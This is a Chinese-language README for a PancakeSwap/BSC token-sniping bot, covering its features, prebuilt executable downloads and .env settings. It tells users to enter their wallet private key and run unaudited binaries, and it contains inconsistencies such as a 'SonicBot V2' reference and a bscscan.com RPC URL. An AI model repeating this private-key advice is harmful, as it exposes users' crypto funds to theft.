# 🚀 Pancakeswap BSC Sniper Bot 🚀



![donghua](https://github.com/CrypFrederic/image1/blob/main/md/donghua.gif)







## 目录

- 警告
- 特征
- 安装步骤
- 开始运行
- 配置文件(.env.bsc)



## 警告

一切代码开源,你可以查看任何代码.

我们只提供机器人,狙击是高风险的,你需要有阅读智能合约和与狙击相关的技能.

我们不承担任何形式的损失.玩得聪明,狙击得聪明.要使用这个机器人,你至少需要在钱包里剩余0.2- 0.3个BNB.



## 特征

![1](https://github.com/CrypFrederic/image1/blob/main/md/1.png)

- BUY(买入)：适用于已经发行、具有流动性且可交易的硬币,这基本上就是普通的交换,就像你在PancakeSwap交换中做的那样
- SNIPE LIQUIDITY(狙击流动性)：这是流动池,所以这个选项只能用于fairlaunch令牌
- ULTIMATE BUY(终极购买)：这是一个强大的功能,因为您可以从任何平台,如DXSALE, UNICRYPT, PINKSALE和许多更多的清单令牌.如果你打算选择还没有开放交易的硬币,且代币已经有流动性,但不能交易,你可以使用这个功能,我真的很喜欢这个功能,哈哈
- SELL(卖出):如果你使用SELL_WATCHER或TIME_TO_SELL,它将遵循你的环境设置.如果你想用这个选项立即卖出,只需关闭SELL_WATCHER或TIME_TO_SELL特性
- SELL AT(在哪儿卖出)：设置价格卖出,当硬币价格达到设置值,卖出硬币
- WATCH REMOVE LIQUIDITY(观察移除流动性)：在移除流动池之前卖出,防止发生骗子硬币
- EXIT(退出)：退出程序



Sure,还有其他特征

- 多次连续购买硬币
- 检查硬币税收,防止高税,同时可以设置购买的最高税,当税低于设定值时,买入硬币
- 地毯检查,增发、变动税等骗子硬币
- 设置卖出条件,多少盈利或多少亏损
- 设置买入多少时间后卖出



## 安装步骤

### 下载打包程序

一些朋友没有编程基础,为大家使用方便,我们使用Node.js&PKG将程序打包为可执行文件,支持windows/macos/linux操作系统,双击直接运行.

你拥有的应用程序

- windows：[这里下载](https://github.com/CrypFrederic/Pancakeswap-BSC-Sniper-Bot/releases/download/v1.0.0/pcs_bot_win_x64.zip) 
- macos：[这里下载](https://github.com/CrypFrederic/Pancakeswap-BSC-Sniper-Bot/releases/download/v1.0.0/pcs_bot_macos.zip) 
- linux：[这里下载](https://github.com/CrypFrederic/Pancakeswap-BSC-Sniper-Bot/releases/download/v1.0.0/pcs_bot_linux.zip) 

下载后,先修改配置文件(.env.bsc),填写Adress和Private_Key,可以运行程序.

### 自行安装

会在这里提供安装指南,请仔细阅读并遵循所有步骤.

你需要拥有和安装的应用程序

- Node.js : [这里下载](https://nodejs.org/en/) ( 下载版本 14 )

- Code Editor (VsCode) : [这里下载](https://code.visualstudio.com/)

  

这个机器人是用Javascript/Node.Js语言编写的,所以你需要在你的电脑上安装Node.Js.

为了打开和配置机器人文件,你需要代码编辑器,我推荐VisualStudioCode,因为它是免费的,有一个友好的用户界面.

#### Node.js 

![node1](https://github.com/CrypFrederic/image1/blob/main/md/node1.png)

检查每个安装的所有选项

![node2](https://github.com/CrypFrederic/image1/blob/main/md/node2.png)

对于nodejs,您将看到这个PowerShell终端弹出

![node3](https://github.com/CrypFrederic/image1/blob/main/md/node3.png)

请稍等,不要关闭

终端,直到它说“键入ENTER退出”当消息显示按ENTER与你的键盘,它将自己关闭

#### Code Editor (VsCode)

![vs2](https://github.com/CrypFrederic/image1/blob/main/md/vs2.png)





下载并安装上一页中的所有文件后,现在就可以下载SonicBot V2文件了.

下载过程完成后,你需要解压机器人文件夹,我建议解压文件夹到你的桌面,或者你可以选择任何位置的机器人文件在你的电脑.

现在用Visual Studio Code打开bot文件夹

![vs1](https://github.com/CrypFrederic/image1/blob/main/md/vs1.png)

现在你需要安装机器人需要的模块文件.安装模块只需在VsCode中打开终端,如下图所示:

![vs3](https://github.com/CrypFrederic/image1/blob/main/md/vs3.png)

一旦终端打开,输入“npm install”,然后用键盘输入

![vs4](https://github.com/CrypFrederic/image1/blob/main/md/vs4.png)

当你看到这个结果,那么npm安装过程就完成了:)

![vs5](https://github.com/CrypFrederic/image1/blob/main/md/vs5.png)

现在所有的安装都完成了


## 开始运行

`npm run snipe`


## 配置文件(.env.bsc)

```
#这是一个处理交易的路由器,不要更改!
BNB_CONTRACT=0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
BUSD_CONTRACT=0xe9e7cea3dedca5984780bafc599bd69add087d56
NETWORK_RPC=https://bscscan.com/
NETWORK_RPC_API=https://api.bscscan.com/
WSS_NODE=wss://bsc-ws-node.nariox.org:443
#这是一个处理交易的路由器,不要更改!
```

在本部分中,您只能更改WSS_NODE,这是什么?与区块链的一个url链接连接([你可以在这里阅读binance文档,看看是什么rpc](https://docs.binance.org/smart-chain/developer/rpc.html)) env文件是免费的公共节点从binance社区,但你真的需要自己的私人节点甚至Fullnode让狙击一个稳定和快速连接

因为它是一个免费的公共节点,它有一个限制,我不知道确切的限制是多少,但我可以保证它是非常糟糕的狙击bot使用公共节点.因此,使用您自己的私有节点或构建您的Fullnode.

Fullnode比quickknode更好,为什么?Fullnode没有限制.所以你可以随时使用它,不用担心.

现在' wss://bsc-ws-node.nariox.org:443 '速度较慢.为此,您可以使用私有节点或构建自己的节点.它比公共节点快.下面是我对私有节点的建议:

1. https://getblock.io/en/
2. https://www.quicknode.com/
3. https://www.ankr.com/ 



```
#网络和dex配置

NETWORK=bsc

MODULE=pancakeswap

#网络和dex配置
```

设置网络节点为BSC

交易所为pancakeswap



```
#如果您想在多个终端中使用bot,可以更改端口

PORT=5000

#如果您想在多个终端中使用bot,可以更改端口
```

对于端口,如果你想同时运行2个bot,你可以改变它,但记住,如果你在同一台电脑上运行2个或更多bot,你需要使用不同的钱包

要同时运行这两个bot,只需将你的bot文件夹复制到另一个目录

在创建了bot的不同文件夹后,只需将PORT更改为5002,5005等.



```
#钱包配置

YOUR_ADDRESS=

YOUR_MNEMONIC=

#钱包配置
```

在这部分中,将你的钱包地址填入YOUR_ADDRESS,这个地址将使用这个bot,在YOUR_MNEMONIC中填入你的私钥而不是助记词



```
#狙击配置

TO_PURCHASE=0xe9e7cea3dedca5984780bafc599bd69add087d56

AMOUNT_OF_BUY=0.001

GWEI_SELL=5

GWEI_BUY=10

GAS_LIMIT=1500000

SPAM_BUY=null

MAX_TAX_SELL=9

MAX_TAX_BUY=1

CHECK_TAX=false

RUG_CHECKER=false

#狙击配置
```

**TO_PURCHASE** =你想买的目标硬币地址

**AMOUNT_OF_BUY**=这是您通过BNB购买的金额

**GWEI_SELL**=当您想要出售硬币时,您将使用多少Gwei

**GWEI_BUY**=当你想购买硬币时,你将使用多少Gwei

**GAS_LIMIT**=当你想购买代币时,你将使用多少汽油限制

**Spambuy** =你想在同一时间发送多少交易,你可以在同一时间发送10个交易在同一区块(如果你不想使用这个填充null / 0)

**MAX_TAX_SELL**=出售目标硬币有多少税收宽容度

**MAX_TAX_BUY**=购买目标硬币有多少税收宽容度

**CHECK_TAX**=如果你不想使用这个税负公差特性,就用false填充,如果你想使用这个税负公差特性,就用true填充

**RUG_CHECKER**=避免购买增发、调整税收等骗子硬币,用false或true填充



对于税收宽容,你可能有点困惑,所以事情是这样的

这只是为了避免你在狙击硬币时被征税,怎么做?

例如:你将狙击一个硬币,如果你在第一次购买,或者我们可以说在0-1区块购买或在增加流动性/开放交易时购买,但他们将向你征收99%的税,然后,您将狙击硬币与您的税收宽容设置,买入和卖出都是40.当流动性被增加/交易被允许,bot将显示多少税.由于你的购买和出售的最高税率是40%,机器人将继续扫描,直到目标代币的税收是正常的或低于你的最大税收容忍



```
#出售设置

AUTO_SELL=true

TAKING_PROFIT=0.1

STOP_LOSS=0.01

AMOUNT_OF_SELL=40


#==出售选项1==

SELL_WATCHER=false

#==出售选项1==


#==出售选项2==

TIME_TO_SELL=2

#==出售选项2==


#==出售选项3==

SELL_AT= 18

#==出售选项3==



#出售设置
```

在这个销售配置部分,我们有三种不同的销售

**SELL_WATCHER**可以监控多少利润,如果你想在获利200%时出售,设置TAKING_PROFIT=200

如果你想在你的首次买入下跌30%时出售,那么就把STOP_LOSS=30.如果你不想使用这个特性,只需更改SELL_WATCHER=false.不要使用TAKE_PROFIT=0或STOP_LOSS=0,它会给出一些错误

SELL_WATCHER=true/false ( 不要使用大写)



**SELL_AT**该特性允许您进行限价卖出订单.例如,你在价格为18美元时购买CAKE硬币,你想在价格触及18.4美元时卖出,你只需要在SELL_AT中填写18.4美元.



**AMOUNT_OF_SELL**是你想出售多少硬币,最大值是98,这意味着你将出售98%的硬币



**AUTO_SELL**当你想立即买进卖出时,你可以填写AUTO_SELL=true和填写TIME_TO_SELL=3,它会在你的买入被执行3秒后立即卖出

不要使用TIME_TO_SELL=0,最小值为1

AUTO_SELL=true/false ( 不要使用大写)
